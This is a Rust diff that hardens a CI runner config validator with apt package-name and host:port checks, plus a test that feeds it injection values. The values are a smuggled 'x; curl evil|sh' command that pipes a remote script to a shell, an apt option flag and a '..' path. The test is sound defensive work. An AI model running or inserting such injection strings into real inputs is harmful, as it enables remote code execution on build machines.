@@ -89,6 +89,7 @@ impl Config {
     fn validate(&self) -> Result<(), String> {
         let word = |s: &str| {
             !s.is_empty()
+                && !s.chars().all(|c| c == '.')
                 && s.chars()
                     .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
         };
@@ -127,12 +128,11 @@ impl Config {
         if self.python_seed.size == 0 {
             return Err("config: python_seed.size must be set".into());
         }
-        if self
-            .apt_packages
-            .iter()
-            .any(|p| !word(p) && !p.contains('+'))
-        {
+        if self.apt_packages.iter().any(|p| !apt_name(p)) {
             return Err("config: apt_packages holds an invalid package name".into());
+        }
+        if !host_port(&self.temporal_test_address) {
+            return Err("config: temporal_test_address must be host:port".into());
         }
         if !self.home_base.is_absolute() || !self.python_seed.tool_cache.is_absolute() {
             return Err("config: home_base and tool_cache must be absolute".into());
@@ -141,6 +141,28 @@ impl Config {
             return Err("config: count must be 1..=64".into());
         }
         Ok(())
+    }
+}
+
+fn apt_name(p: &str) -> bool {
+    p.chars()
+        .next()
+        .is_some_and(|c| c.is_ascii_lowercase() || c.is_ascii_digit())
+        && p.chars()
+            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '+' | '.' | '-'))
+}
+
+fn host_port(a: &str) -> bool {
+    match a.rsplit_once(':') {
+        Some((h, port)) => {
+            !h.is_empty()
+                && h.chars()
+                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-'))
+                && !port.is_empty()
+                && port.len() <= 5
+                && port.chars().all(|c| c.is_ascii_digit())
+        }
+        None => false,
     }
 }
 
@@ -169,5 +191,25 @@ mod tests {
         let bad_url = ok.replacen("https://", "http://", 1);
         assert!(Config::parse(&bad_url).unwrap_err().contains("https"));
         assert!(Config::parse(&format!("bogus = 1\n{ok}")).is_err());
+    }
+    #[test]
+    fn rejects_injection_in_address_apt_and_dot_versions() {
+        let ok = include_str!("../../../../docs/operations/ci-runners.example.toml");
+        let addr = sample().temporal_test_address;
+        let bad = ok.replacen(&addr, "x; curl evil|sh", 1);
+        assert!(Config::parse(&bad)
+            .unwrap_err()
+            .contains("temporal_test_address"));
+        let pkg = sample().apt_packages[0].clone();
+        for evil in ["--allow-unauthenticated", "x+;y"] {
+            let bad = ok.replacen(&format!("\"{pkg}\""), &format!("\"{evil}\""), 1);
+            assert!(
+                Config::parse(&bad).unwrap_err().contains("apt_packages"),
+                "{evil}"
+            );
+        }
+        let v = sample().python_seed.version;
+        let bad = ok.replacen(&format!("\"{v}\""), "\"..\"", 1);
+        assert!(Config::parse(&bad).is_err());
     }
 }
